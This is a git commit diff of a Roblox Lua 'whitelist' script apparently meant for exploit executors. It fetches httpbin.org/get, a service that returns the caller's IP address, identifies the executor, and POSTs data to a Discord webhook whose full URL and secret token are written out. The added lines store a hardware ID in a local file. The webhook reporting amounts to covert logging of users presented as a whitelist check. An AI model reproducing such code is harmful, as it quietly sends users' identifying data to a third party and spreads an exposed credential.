941479bf6868b392be9e473c38b49b4f480af2b0
Bo <bo.van.laarhoven@gmail.com>
2022-12-27 17:59:12 +0100

    Update Whitelist.lua

--- Whitelist.lua
+++ Whitelist.lua
@@ -1,3 +1,6 @@
+local filename = "Whitelist.txt"
+local json
+local HttpService = game:GetService("HttpService")
 local Http_Request = request;
 local Body = Http_Request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
 local Decoded = game:GetService('HttpService'):JSONDecode(Body)
@@ -17,7 +20,6 @@ print("[Whitelist] Loading...")
 wait(0.2)
 print("[Whitelist] ".. identifyexecutor())
 wait(0.2)
-print("[Whitelist] Took: " .. math.round(os.clock() - Time) .. "s")
 local url = "https://discord.com/api/webhooks/1057335544092303360/EsAjv4tdlwGFF_3p36CgFclWkZSb4YXC6D79wwO_BHGkS7H-4SH-53k7PSseXqxNagfE"
 local data = {
    ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
@@ -46,3 +48,25 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 wait(1)
+
+print("[Whitelist] Checking Whitelist...")
+
+
+if (writefile) then
+    json = HttpService:JSONEncode({["hwid"] = GetHwid})
+    writefile(filename, json)
+else
+    json = readfile(filename)
+end
+
+print("[Whitelist] Took: " .. math.round(os.clock() - Time) .. "s")
+
+if (not json) then
+    print("[Whitelist] Failed to load whitelist.")
+    return
+end
+
+if (not HttpService:JSONDecode(json)) then
+    print("[Whitelist] Failed to load whitelist.")
+    return
+end
